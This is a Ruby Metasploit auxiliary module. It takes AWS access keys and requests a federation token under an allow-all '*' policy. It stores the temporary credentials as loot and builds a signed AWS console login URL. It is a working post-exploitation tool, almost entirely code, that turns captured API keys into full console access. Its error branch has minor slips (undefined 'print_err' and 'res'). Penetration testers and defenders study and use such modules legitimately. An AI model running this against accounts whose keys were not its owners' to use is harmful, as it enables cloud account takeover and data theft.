require 'msf/core'
require 'metasploit/framework/aws/client'

class MetasploitModule < Msf::Auxiliary
  include Metasploit::Framework::Aws::Client

  def initialize(info={})
    super(update_info(info,
      'Name'           => "AWS Console",
      'Description'    => %q{
        This module will print a URL to open the AWS console given valid AWS API access keys.
      },
      'License'        => MSF_LICENSE,
      'Author'         => ['Javier Godinez <godinezj[at]gmail.com>']
    ))

    register_options(
      [
        OptString.new('RHOST', [true, 'AWS STS Endpoint', 'sts.amazonaws.com']),
        OptString.new('RPORT', [true, 'AWS STS Endpoint TCP Port', 443]),
        OptString.new('SSL', [true, 'AWS STS Endpoint SSL', true]),
        OptString.new('ACCESS_KEY', [true, 'AWS access key', '']),
        OptString.new('SECRET', [true, 'AWS secret key', '']),
        OptString.new('CONSOLE_NAME', [true, 'The AWS console name', 'Metasploit']),
        OptString.new('Region', [true, 'The default region', 'us-east-1' ])
      ])
    register_advanced_options(
      [
        OptString.new('AWS_SIGNIN_RHOST', [true, 'The AWS signin hostname', 'signin.aws.amazon.com']),
        OptString.new('AWS_SIGNIN_RPORT', [true, 'The AWS signin hostname port', 443]),
        OptString.new('AWS_SIGNIN_SSL', [true, 'The AWS signin SSL setting', true])
      ])
    deregister_options('VHOST')
  end


  def run
    print_status("Generating fed token")
    action = 'GetFederationToken'
    policy = '{"Version": "2012-10-17", "Statement": [{"Action": "*","Effect": "Allow", "Resource": "*" }]}'
    creds = {
      'AccessKeyId' => datastore['ACCESS_KEY'],
      'SecretAccessKey' => datastore['SECRET']
    }
    doc = call_sts(creds, 'Action' => action, 'Name' => datastore['CONSOLE_NAME'], 'Policy' => URI.encode(policy))
    doc = print_results(doc, action)
    return if doc.nil?
    path = store_loot(datastore['ACCESS_KEY'], 'text/plain', datastore['RHOST'], doc.to_json)
    print_good("Generated temp API keys stored at: " + path)

    creds = doc.fetch('Credentials')
    session_json = {
      sessionId: creds.fetch('AccessKeyId'),
      sessionKey: creds.fetch('SecretAccessKey'),
      sessionToken: creds.fetch('SessionToken')
    }.to_json

    resp = send_request_raw(
      'method'   => 'GET',
      'uri'      => '/federation?Action=getSigninToken' + "&SessionType=json&Session=" + CGI.escape(session_json),
      'rhost'    => datastore['AWS_SIGNIN_RHOST'],
      'rport'    => datastore['AWS_SIGNIN_RPORT'],
      'ssl'      => datastore['AWS_SIGNIN_SSL']
    )
    if resp.code != 200
      print_err("Error generating console login")
      print_error(res.body)
      return
    end
    resp_json = JSON.parse(resp.body)
    signin_token = resp_json['SigninToken']
    signin_token_param = "&SigninToken=" + CGI.escape(signin_token)
    issuer_param = "&Issuer=" + CGI.escape(datastore['CONSOLE_NAME'])
    destination_param = "&Destination=" + CGI.escape("https://console.aws.amazon.com/")
    login_url = "https://#{datastore['AWS_SIGNIN_RHOST']}/federation?Action=login" + signin_token_param + issuer_param + destination_param

    print_good("Paste this into your browser: #{login_url}")
  end
end

